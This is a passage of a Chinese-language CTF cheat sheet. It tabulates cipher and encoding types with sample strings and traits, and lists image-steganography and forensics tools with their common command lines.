| <font style="color:rgb(51, 51, 51);">poem codes 诗歌密码</font> | <font style="color:rgb(51, 51, 51);">the life that i have</font> | <font style="color:rgb(51, 51, 51);">诗歌，多串英文单词组成，需要解密消息（key）</font> |
| <font style="color:rgb(51, 51, 51);">rockstar 编程语言</font> | <font style="color:rgb(51, 51, 51);">Say Problem MakersThe flag is in your heartThe confusion is in your mind</font> | <font style="color:rgb(51, 51, 51);">rockstar编程语言</font> |
| <font style="color:rgb(51, 51, 51);">ppencode</font> | <font style="color:rgb(51, 51, 51);">length q continue vec and print</font> | <font style="color:rgb(51, 51, 51);">多串英文单词组成</font> |
| <font style="color:rgb(51, 51, 51);">五笔输入法</font> | <font style="color:rgb(51, 51, 51);">DSOA DSX CXA ACXS</font> | <font style="color:rgb(51, 51, 51);">多串英文组成</font> |
| <font style="color:rgb(51, 51, 51);">仓吉输入法</font> | <font style="color:rgb(51, 51, 51);">SIUD DSXX CAXX</font> | <font style="color:rgb(51, 51, 51);">多串英文组成</font> |
| <font style="color:rgb(51, 51, 51);">郑码</font> | <font style="color:rgb(51, 51, 51);">CXEF FXVV SAAAS</font> | <font style="color:rgb(51, 51, 51);">多串英文组成</font> |


### <font style="color:rgb(51, 51, 51);">密码编码类型（位移密码）</font>
| **<font style="color:rgb(51, 51, 51);">密码编码类型（位移密码）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">简单换位密码</font> | <font style="color:rgb(51, 51, 51);">uzdf{dasf_asdd_as}</font> | <font style="color:rgb(51, 51, 51);">换位密码</font> |
| <font style="color:rgb(51, 51, 51);">埃特巴什密码</font> | <font style="color:rgb(51, 51, 51);">uozt{svoold}</font> | <font style="color:rgb(51, 51, 51);">换位密码表一：abcd...xyz表二：zyx...cba</font> |
| <font style="color:rgb(51, 51, 51);">qwert密码</font> | <font style="color:rgb(51, 51, 51);">uozt{svoold}</font> | <font style="color:rgb(51, 51, 51);">换位密码表一：abcdefg...xyz表二：qwerty...bnm</font> |
| <font style="color:rgb(51, 51, 51);">仿射密码</font> | <font style="color:rgb(51, 51, 51);">iwft{exwwdn}</font> | <font style="color:rgb(51, 51, 51);">换位密码，需要两个整数key参数</font> |
| <font style="color:rgb(51, 51, 51);">维吉尼亚密码</font> | <font style="color:rgb(51, 51, 51);">ulsy{dscodw}</font> | <font style="color:rgb(51, 51, 51);">矩阵密码guballa.de 维吉尼亚密码爆破quipquip，快速求解器爆破</font> |
| | | |
| <font style="color:rgb(51, 51, 51);">关键字密码</font> | <font style="color:rgb(51, 51, 51);">RGPD{BOGGJVJMW}</font> | <font style="color:rgb(51, 51, 51);">矩阵密码，需要key</font> |
| <font style="color:rgb(51, 51, 51);">双密码</font> | <font style="color:rgb(51, 51, 51);">hbfnpoaahvdii</font> | <font style="color:rgb(51, 51, 51);">矩阵密码，需要长度为25的字母表key，以及一个整数key</font> |
| <font style="color:rgb(51, 51, 51);">普莱菲尔密码</font> | <font style="color:rgb(51, 51, 51);">LUNBAKSS</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，矩阵密码，需要key</font> |
| <font style="color:rgb(51, 51, 51);">porta密码</font> | <font style="color:rgb(51, 51, 51);">ztxubepz</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，矩阵密码，需要key（矩阵类似维吉尼亚密码表）</font> |


### <font style="color:rgb(51, 51, 51);">密码编码类型（回路密码）</font>
| **<font style="color:rgb(51, 51, 51);">密码编码类型（回路密码）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">栅栏密码</font> | <font style="color:rgb(51, 51, 51);">fa{elwr}lghlood</font> | <font style="color:rgb(51, 51, 51);">以W回路排列，可填充大量字符</font> |
| <font style="color:rgb(51, 51, 51);">曲路密码</font> | <font style="color:rgb(51, 51, 51);">}ey@r{gag10_f</font> | <font style="color:rgb(51, 51, 51);">以回路排列，可填充大量字符</font> |
| <font style="color:rgb(51, 51, 51);">列位移密码</font> | <font style="color:rgb(51, 51, 51);">llefolagh</font> | <font style="color:rgb(51, 51, 51);">以回路排列，可填充大量字符，需要key</font> |


### <font style="color:rgb(51, 51, 51);">密码编码类型（乱码）</font>
| **<font style="color:rgb(51, 51, 51);">密码编码类型（乱码）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| --- | --- | --- |
| <font style="color:rgb(51, 51, 51);">cipher text-encoding-brust（选项改为decode）</font> | <font style="color:rgb(51, 51, 51);">ÃÜÂëÎª£º¼òµ¥µÄ±àÂë</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">miagic（intensive mode Extensive language ）类似text decode</font> | <font style="color:rgb(51, 51, 51);">ÃÜÂëÎª£º¼òµ¥µÄ±à</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">EBDIC</font> | <font style="color:rgb(51, 51, 51);">ÃÜÂëÎª£º¼òµ¥µ</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">python picle反序列化</font> | <font style="color:rgb(51, 51, 51);">òµ¥µ</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">字频统计</font> | <font style="color:rgb(51, 51, 51);">ddf9</font>_<font style="color:rgb(51, 51, 51);">(_F</font>_<font style="color:rgb(51, 51, 51);">ADF)as</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">ROT47</font> | <font style="color:rgb(51, 51, 51);">v)_L__F0F49023@FE0#@EN</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">base91</font> | <font style="color:rgb(51, 51, 51);">TPwJh>A</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">base92</font> | <font style="color:rgb(51, 51, 51);">FckKnsM*k</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">base2048</font> | <font style="color:rgb(51, 51, 51);">FckKnsM*k</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">RRencode</font> | <font style="color:rgb(51, 51, 51);">(|$$&&@@_=</font>![](https://www.yuque.com/api/services/graph/generate_redirect/latex?%40)<font style="color:rgb(51, 51, 51);">%3B#card=math&code=%40%29%3B&id=cavV1)><</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">文本异或</font> | <font style="color:rgb(51, 51, 51);">ddf9</font>_<font style="color:rgb(51, 51, 51);">(_F</font>_<font style="color:rgb(51, 51, 51);">ADF)as</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">WingDings</font> | <font style="color:rgb(51, 51, 51);">ddf9</font>_<font style="color:rgb(51, 51, 51);">(_F</font>_<font style="color:rgb(51, 51, 51);">ADF)as</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">UUencode</font> | <font style="color:rgb(51, 51, 51);">%:&5L;&`</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">unicode</font> | <font style="color:rgb(51, 51, 51);">䴀娀圀䜀䌀娀娀䤀一</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| ROT8000 | 籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆 | 乱码 |
| <font style="color:rgb(51, 51, 51);">JScript.Encode</font> | <font style="color:rgb(51, 51, 51);">#@~^MQAAAA== Um.bwDR+1tKcJtH)</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">变异凯撒</font> | <font style="color:rgb(51, 51, 51);">afZ_r9VYfScOeO_UL^RWUc</font> | <font style="color:rgb(51, 51, 51);">类似乱码</font> |
| <font style="color:rgb(51, 51, 51);">在ascii码上分别+5 +6 +7 ,,, +n</font> | | |
| <font style="color:rgb(51, 51, 51);">键盘密码</font> | <font style="color:rgb(51, 51, 51);">O(*UJKMN &^TGB</font> | <font style="color:rgb(51, 51, 51);">类似乱码，多串字符串组成</font> |
| <font style="color:rgb(51, 51, 51);">AAencode</font> | <font style="color:rgb(51, 51, 51);">ωﾟﾉ= /｀ｍ´）ﾉ ~┻━</font> | <font style="color:rgb(51, 51, 51);">颜文字</font> |
| <font style="color:rgb(51, 51, 51);">JJencode</font> | <font style="color:rgb(51, 51, 51);">ωﾟﾉ= /｀ｍ´）ﾉ ~┻━</font> | <font style="color:rgb(51, 51, 51);">颜文字，乱码</font> |
| <font style="color:rgb(51, 51, 51);">brainfuck</font><br/><font style="color:rgb(51, 51, 51);">（bftools run 进行解密）</font> | <font style="color:rgb(51, 51, 51);"><>}}<>++><</font> | <font style="color:rgb(51, 51, 51);">+-<>[] 组成 </font><font style="color:rgb(51, 51, 51);background-color:#F5D480;">头部有 15 个 .+</font> |
| <font style="color:rgb(51, 51, 51);">jsfuck</font> | <font style="color:rgb(51, 51, 51);">[]{}!+</font> | <font style="color:rgb(51, 51, 51);">+![]{} 组成 </font> |
| <font style="color:rgb(51, 51, 51);">jother</font> | <font style="color:rgb(51, 51, 51);">[]+![]{}()</font> | <font style="color:rgb(51, 51, 51);">+![]{}() 组成</font> |


### <font style="color:rgb(51, 51, 51);">密码编码类型（杂类）</font>
#### 杂类-中文
<font style="color:#DF2A3F;background-color:#FBDE28;">杂类中文编码请使用随波逐流工具!!!</font>

| <font style="color:rgb(51, 51, 51);">六十年甲子</font> | <font style="color:rgb(51, 51, 51);">甲子 乙丑</font> | <font style="color:rgb(51, 51, 51);">天干地支表对应干支表排序数 1-60 再加上一个甲子60 得到的ascii</font> |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">诗歌密码</font> | <font style="color:rgb(51, 51, 51);">窗前明月光 疑似地上霜hello world i love it</font> | <font style="color:rgb(51, 51, 51);">诗歌</font> |
| <font style="color:rgb(51, 51, 51);">兽音密码</font> | <font style="color:rgb(51, 51, 51);">嗷呜，嗷嗷嗷呜</font> | <font style="color:rgb(51, 51, 51);">兽音</font> |
| <font style="color:rgb(51, 51, 51);">佛曰</font> | <font style="color:rgb(51, 51, 51);">佛曰：僧諳缽薩嚤伏諳空諳耨諳伏諳念如諳囑諳</font> | <font style="color:rgb(51, 51, 51);">佛曰：新佛曰：佛又曰：</font> |
| <font style="color:rgb(51, 51, 51);">熊曰</font> | <font style="color:rgb(51, 51, 51);">熊曰：呋食性哮噤樣覺</font> | <font style="color:rgb(51, 51, 51);">熊曰：</font> |
| <font style="color:rgb(51, 51, 51);">社会主义核心价值观</font> | <font style="color:rgb(51, 51, 51);">富强民主文明和谐自由</font> | <font style="color:rgb(51, 51, 51);">社会主义核心价值观</font> |
| <font style="color:rgb(51, 51, 51);">阴阳怪气</font> | <font style="color:rgb(51, 51, 51);">不 会 吧 ？ 就 这 ¿ 不 会 吧 ？</font> | <font style="color:rgb(51, 51, 51);">不会吧 就这</font> |
| <font style="color:rgb(51, 51, 51);">百家姓暗号</font> | <font style="color:rgb(51, 51, 51);">赵钱孙李黄</font> | <font style="color:rgb(51, 51, 51);">百家姓姓名</font> |
| <font style="color:rgb(51, 51, 51);">笔画隐写（当铺密码）</font> | <font style="color:rgb(51, 51, 51);">人王二一</font> | <font style="color:rgb(51, 51, 51);">按照突出的笔尖算数量</font> |
| <font style="color:rgb(51, 51, 51);">文言文代码</font> | <font style="color:rgb(51, 51, 51);">曰：然者</font> | <font style="color:rgb(51, 51, 51);">文言IDE</font> |


#### 杂类-其它
| **<font style="color:rgb(51, 51, 51);">密码编码类型（杂类）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">dcode.fr/cipher-identifier</font> | <font style="color:rgb(51, 51, 51);">+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-</font> | |
| <font style="color:rgb(51, 51, 51);">cipherchef text-encoding-brust（选项改为decode）</font> | <font style="color:rgb(51, 51, 51);">ÃÜÂëÎª£º¼òµ¥µÄ±àÂë</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">base100</font> | **<font style="color:rgb(51, 51, 51);">😀</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😁</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😂</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">🤣</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😃</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😄</font>** | <font style="color:rgb(51, 51, 51);">emoji</font> |
| <font style="color:rgb(51, 51, 51);">emoji</font> | **<font style="color:rgb(51, 51, 51);">😀</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😁</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😂</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">🤣</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😃</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😄</font>** | <font style="color:rgb(51, 51, 51);">emoji</font> |
| <font style="color:rgb(51, 51, 51);">webdingswingdings</font> | <font style="color:rgb(51, 51, 51);">特殊的icon字体(杂锦字体)</font> | <font style="color:rgb(51, 51, 51);">特殊的icon字体</font> |
| <font style="color:rgb(51, 51, 51);">pika</font> | <font style="color:rgb(51, 51, 51);">pika piika pikapika</font> | <font style="color:rgb(51, 51, 51);">pika</font> |
| <font style="color:rgb(51, 51, 51);">俄语隐写</font> | <font style="color:rgb(51, 51, 51);">Привет</font> | <font style="color:rgb(51, 51, 51);">俄语spammimic解码</font> |
| <font style="color:rgb(51, 51, 51);">特定字符编码</font> | <font style="color:rgb(51, 51, 51);">汉字，数字，字母，音乐符号，国际音标，盲文，韩文，日文，彝文，泰文，箭头符号，花朵符号，俄文</font> | <font style="color:rgb(51, 51, 51);">特定字符，末尾==</font> |
| <font style="color:rgb(51, 51, 51);">蝌蚪文</font> | <font style="color:rgb(51, 51, 51);">无法展示 文字类似蝌蚪</font> | |
| <font style="color:rgb(51, 51, 51);">盲文隐写</font> | <font style="color:rgb(51, 51, 51);">⣿ ⠼ ⠸</font> | <font style="color:rgb(51, 51, 51);">盲文</font> |
| <font style="color:rgb(51, 51, 51);">boke code</font> | <font style="color:rgb(51, 51, 51);">⣿ ⠼ ⠸</font> | <font style="color:rgb(51, 51, 51);">盲文</font> |
| <font style="color:rgb(51, 51, 51);">spam垃圾邮件隐写</font> | <font style="color:rgb(51, 51, 51);">i tell you 70 present sall</font> | <font style="color:rgb(51, 51, 51);">垃圾邮件spammimic.com</font> |


| **<font style="color:rgb(51, 51, 51);">纯文本隐写类型</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| --- | :--- | --- |
| <font style="color:rgb(51, 51, 51);">零宽隐写（可隐写文件）</font> | <font style="color:rgb(51, 51, 51);">â€Œâ€ªâ€ª</font> | <font style="color:rgb(51, 51, 51);">文本长度过长不匹配 16进制下显示â€Œâ€ªâ€ª</font> |
| <font style="color:rgb(51, 51, 51);">text_watermark</font> | <font style="color:rgb(51, 51, 51);">â€Œâ€ªâ€ª</font> | <font style="color:rgb(51, 51, 51);">类似 0 宽，都是 \u200c</font> |
| <font style="color:rgb(51, 51, 51);">snow隐写</font> | | <font style="color:rgb(51, 51, 51);">空白格隐写</font> |
| <font style="color:rgb(51, 51, 51);">whitespcae</font> | | <font style="color:rgb(51, 51, 51);">许多回车键 缩进之类的文本</font> |
| <font style="color:rgb(51, 51, 51);">cloakify</font> | <font style="color:rgb(51, 51, 51);">hello nice too meet</font> | 很多英文单词 |
| twitter secret message | <font style="color:rgb(51, 51, 51);">hello nice too meet</font> | 很多大小不一样的字符 |


| **<font style="color:rgb(51, 51, 51);">特殊编码类型</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">gunplot</font> | <font style="color:rgb(51, 51, 51);">(0,1,1),(0,1,1),(0,2,2),(0,2,1)</font> | <font style="color:rgb(51, 51, 51);">平面坐标系，空间坐标系</font> |
| <font style="color:rgb(51, 51, 51);">GPS Visualizer</font> | <font style="color:rgb(51, 51, 51);">116.117529w, 39.957202e</font> | <font style="color:rgb(51, 51, 51);">GPS坐标</font> |
| <font style="color:rgb(51, 51, 51);">Gcode，G语言</font> | <font style="color:rgb(51, 51, 51);">G90 G21 XY7 F100 M2</font> | <font style="color:rgb(51, 51, 51);">Gcode编程语言</font> |
| <font style="color:rgb(51, 51, 51);">UT Dallas</font> | <font style="color:rgb(51, 51, 51);">FD CS PU HT SU RT LT</font> | <font style="color:rgb(51, 51, 51);">logo绘图</font> |




---

## <font style="color:rgb(51, 51, 51);">加解密题总结</font>
| **<font style="color:rgb(51, 51, 51);">工具名称</font>** | **<font style="color:rgb(51, 51, 51);">用途</font>** |
| :--- | :--- |
| <font style="color:rgb(51, 51, 51);">VareCrypt</font> | <font style="color:rgb(51, 51, 51);">加解密工具</font> |
| <font style="color:rgb(51, 51, 51);">TrueCrypt</font> | <font style="color:rgb(51, 51, 51);">加解密工具</font> |
| <font style="color:rgb(51, 51, 51);">PasswareKitForensic</font> | <font style="color:rgb(51, 51, 51);">爆破密码</font> |




---

## <font style="color:rgb(51, 51, 51);">图片题总结</font>
### <font style="color:rgb(51, 51, 51);">图片分析工具</font>
| **<font style="color:rgb(51, 51, 51);">工具 / 命令名称（图片信息类）</font>** | **<font style="color:rgb(51, 51, 51);">用途</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** | **<font style="color:rgb(51, 51, 51);">参数（常用）</font>** |
| --- | :--- | --- | :--- |
| <font style="color:rgb(51, 51, 51);">MagicEXIF</font> | <font style="color:rgb(51, 51, 51);">exif</font> | | |
| <font style="color:rgb(51, 51, 51);">exiftool</font> | <font style="color:rgb(51, 51, 51);">exif</font> | <font style="color:rgb(51, 51, 51);">exiftool.exe 输入文件</font><br/><font style="color:rgb(51, 51, 51);">exiftool.exe inputfile</font> | |
| <font style="color:rgb(51, 51, 51);">identify</font> | <font style="color:rgb(51, 51, 51);">exif</font> | <font style="color:rgb(51, 51, 51);">identify 输入文件</font><br/><font style="color:rgb(51, 51, 51);">identify -format "%T" .gif > .txt</font> | |
| <font style="color:rgb(51, 51, 51);">piet</font> | <font style="color:rgb(51, 51, 51);">彩色图片</font> | <font style="color:rgb(51, 51, 51);">neipt -q 图片路径</font> | <font style="color:rgb(51, 51, 51);">-q</font> |
| Imagefuck | <font style="color:rgb(51, 51, 51);">彩色图片</font> | 总结对应 RGB 值对应出现频次 替换成 brainfuck 字符，解码brainfuck字符 | |
| | | | |
| <font style="color:rgb(51, 51, 51);">stegdetect</font> | <font style="color:rgb(51, 51, 51);">查询jpg加密方式</font> | <font style="color:rgb(51, 51, 51);">stegdetect.exe 参数 输入文件</font><br/><font style="color:rgb(51, 51, 51);">stegdetect.exe -s 10 -tjpio inputfile</font> | <font style="color:rgb(51, 51, 51);">-s 敏感度</font><br/><font style="color:rgb(51, 51, 51);">-t 检测哪些加密方式：j-jsteg p-jphide o-outguess i-invisible</font> |
| <font style="color:rgb(51, 51, 51);">tweakpng</font> | <font style="color:rgb(51, 51, 51);">查询png异常</font> | | |
| <font style="color:rgb(51, 51, 51);">pngcheck</font> | <font style="color:rgb(51, 51, 51);">查询png块是否异常</font> | <font style="color:rgb(51, 51, 51);">pngcheck.exe 输入文件</font><br/><font style="color:rgb(51, 51, 51);">pngcheck.exe inputfile</font> | <font style="color:rgb(51, 51, 51);">-7 打印文本块的内容</font><br/><font style="color:rgb(51, 51, 51);">-f 即使出错仍继续</font><br/><font style="color:rgb(51, 51, 51);">-p 显示PLTE tRNS hlST PPLT的内容</font><br/><font style="color:rgb(51, 51, 51);">-q 静默测试</font><br/><font style="color:rgb(51, 51, 51);">-s 在另一个文件中搜索PNG</font><br/><font style="color:rgb(51, 51, 51);">-t 显示tEXt 块内容</font><br/><font style="color:rgb(51, 51, 51);">-V 打印出大多数块的数据</font><br/><font style="color:rgb(51, 51, 51);">-x 搜索PNG并提取</font> |
| <font style="color:rgb(51, 51, 51);">PNGDebugger</font> | <font style="color:rgb(51, 51, 51);">判断crc是否正确</font> | <font style="color:rgb(51, 51, 51);">PNGDebugger.exe 输入文件</font><br/><font style="color:rgb(51, 51, 51);">PNGDebugger.exe inputfile</font> | |
| <font style="color:rgb(51, 51, 51);">APNG Disassembler</font> | <font style="color:rgb(51, 51, 51);">查询apng帧数间隔</font> | | |
| | | | |
| <font style="color:rgb(51, 51, 51);">GIMP</font> | <font style="color:rgb(51, 51, 51);">图片查看</font> | | |
| <font style="color:rgb(51, 51, 51);">bpgview</font> | <font style="color:rgb(51, 51, 51);">查看bpg图片</font> | <font style="color:rgb(51, 51, 51);">bpgview.exe 输入文件</font><br/><font style="color:rgb(51, 51, 51);">bpgview.exe inputfile</font> | |
| | | | |
| <font style="color:rgb(51, 51, 51);">zsteg</font> | <font style="color:rgb(51, 51, 51);">查看lsb隐写</font> | <font style="color:rgb(51, 51, 51);">zsteg 参数 输入文件</font><br/><font style="color:rgb(51, 51, 51);">zsteg -e 颜色通道 inputfile</font> | <font style="color:rgb(51, 51, 51);">-a 查看所有可能通道组合</font><br/><font style="color:rgb(51, 51, 51);">-e 分离文件</font> |
| <font style="color:rgb(51, 51, 51);">stegosolve</font> | <font style="color:rgb(51, 51, 51);">查看lsb隐写，图片结合</font> | | <font style="color:rgb(51, 51, 51);">bitorder:MSB First LSB FirstExtract:Row Columb（读取方式）Bit Plane Order（颜色通道）</font> |
| | | | |
| <font style="color:rgb(51, 51, 51);">BcomparePortable</font> | <font style="color:rgb(51, 51, 51);">图像比较</font> | | |
| <font style="color:rgb(51, 51, 51);">Image magic</font> | <font style="color:rgb(51, 51, 51);">查看图片</font> | | |
| <font style="color:rgb(51, 51, 51);">gaps-master</font> | <font style="color:rgb(51, 51, 51);">拼图</font> | <font style="color:rgb(51, 51, 51);">gaps run ./flag.png newfalg.png --generations=48 --population=20 --size=100</font> | <font style="color:rgb(51, 51, 51);">gaps run 运行拼图./图片路径--generations=--poplation=--size=图片宽度</font> |
| <font style="color:rgb(51, 51, 51);">PhotoShop</font> | <font style="color:rgb(51, 51, 51);">编辑图片</font> | | |


### <font style="color:rgb(51, 51, 51);">图片隐写工具</font>
| **<font style="color:rgb(51, 51, 51);">工具 / 命令名称（隐写工具）</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** | **<font style="color:rgb(51, 51, 51);">参数（常用）</font>** |
| --- | --- | --- |
| <font style="color:rgb(51, 51, 51);">PuzzleSlover（图片梭哈工具）</font> | | |
| <font style="color:rgb(51, 51, 51);">像素隐写</font> | python web.py | 双图对比有一点像素变化，像素隐写 |
| bftools | bftools.exe decode braincopter 输入图片 --output 输出文件 | decode braincopter 解密brainfuck图片 |
| <font style="color:rgb(51, 51, 51);">BlindWaterMark</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">python bwmforpy3.py 参数 输入文件 水印文件 输出文件</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">python2 bwm.py 参数 输入文件 水印文件 输出文件</font><br/><br/>解密：<br/><font style="color:rgb(51, 51, 51);">python bwmforpy3.py encode 输入文件 水印文件 输出文件</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">python bwmforpy3.py decode 输入文件 水印文件 输出文件</font> | <font style="color:rgb(51, 51, 51);">--oldseed 旧算法</font><br/><font style="color:rgb(51, 51, 51);">--alpha 新算法</font> |
| <font style="color:rgb(51, 51, 51);">cloack-pixel-master(lsb)</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">python2 lsb.py hide inputfile outputfile</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：python2 lsb.py extract inputfile outputfile</font> | <font style="color:rgb(51, 51, 51);">hide 隐写extract 解密</font> |
| <font style="color:rgb(51, 51, 51);">F5-steganography</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">cd f5-steganography && java Embed 输入文件 -e 隐藏文件 -p 密码</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：</font><br/><font style="color:rgb(51, 51, 51);">cd f5-steganography && java Extract 输入文件 -e 隐藏文件 -p 密码</font> | <font style="color:rgb(51, 51, 51);">Embed 隐写Extract 解密-e 导入隐藏文件-p 密码</font> |
| <font style="color:rgb(51, 51, 51);">outguess</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">outguess -k 密码 -d 输入文件 隐写文件 输出文件</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：</font><br/><font style="color:rgb(51, 51, 51);">outguess -r 输入文件 输出文件 -k 密码</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">爆破：</font><br/><font style="color:rgb(51, 51, 51);">python outguess爆破脚本.pyoutguess -r inputfile outputfile -k password</font> | <font style="color:rgb(51, 51, 51);">-k 密码-d 输出文件-r 解密文件</font> |
| <font style="color:rgb(51, 51, 51);">steghide</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">steghide embed -cf 输入文件 -ef隐藏文件 -p 密码</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：</font><br/><font style="color:rgb(51, 51, 51);">steghide extract -sf 输入文件 -p 密码</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">爆破：</font><br/><font style="color:rgb(51, 51, 51);">stegseek 隐写图片 爆破字典</font> | <font style="color:rgb(51, 51, 51);">-cf 输入文件-ef 隐藏文件-sf 输出文件-p 密码</font> |
| <font style="color:rgb(51, 51, 51);">stegseek（steghide爆破）</font> | <font style="color:rgb(51, 51, 51);">stegseek 隐写图片 爆破字典</font> | |
| <font style="color:rgb(51, 51, 51);">stegpy</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">stegpy 隐写内容 隐写图片 -p 密码</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：</font><br/><font style="color:rgb(51, 51, 51);">stegpy 隐写图片 -p 密码</font> | <font style="color:rgb(51, 51, 51);">-p 密码</font> |
| <font style="color:rgb(51, 51, 51);">DeEgger Embedder</font> | | |
| <font style="color:rgb(51, 51, 51);">jphide</font> | | |
| <font style="color:rgb(51, 51, 51);">jstego</font> | | |
| <font style="color:rgb(51, 51, 51);">Silent</font> | | |
| <font style="color:rgb(51, 51, 51);">wbStego4.3open</font> | | |
| <font style="color:rgb(51, 51, 51);">S-Tools</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">拖入输入文件-->拖入隐藏文件于隐写文件上方-->hide</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：</font><br/><font style="color:rgb(51, 51, 51);">拖入图片-->邮件隐写文件窗口-->reveal</font> | |


### <font style="color:rgb(51, 51, 51);">图片隐写特征</font>
| **<font style="color:rgb(51, 51, 51);">隐写特征</font>** | |
| :--- | --- |
| <font style="color:rgb(51, 51, 51);">SilentEyes</font> | <font style="color:rgb(51, 51, 51);">图片类型为 BMP JPG 且在Stegslove里不同通道看到很多像素小块 ，文件末有众多乱码</font> |
| <font style="color:rgb(51, 51, 51);">FreefileCamouflage</font> | <font style="color:rgb(51, 51, 51);">末尾有很多base64FF D9 第一段base64 0D 0A 第二段base64 0D 0A</font> |
| <font style="color:rgb(51, 51, 51);">DeEgger Embedder</font> | <font style="color:rgb(51, 51, 51);">末尾有很多无意义字符 IDAT每层大小为200cIDAT每层大小为200c末尾有很多无意义字符</font> |
| <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">末尾ž—º* l<9l0kl10n88j:8<....</font> |
| <font style="color:rgb(51, 51, 51);">stegpy</font> | <font style="color:rgb(51, 51, 51);">看起来有点lsb隐写的样子，但不是</font> |
| <font style="color:rgb(51, 51, 51);">Free File Camouflage</font> | <font style="color:rgb(51, 51, 51);">文件末尾有一段base64编码</font> |


### <font style="color:rgb(51, 51, 51);">图片类型：JPG</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码</font>** |
| :--- | :--- | :--- |
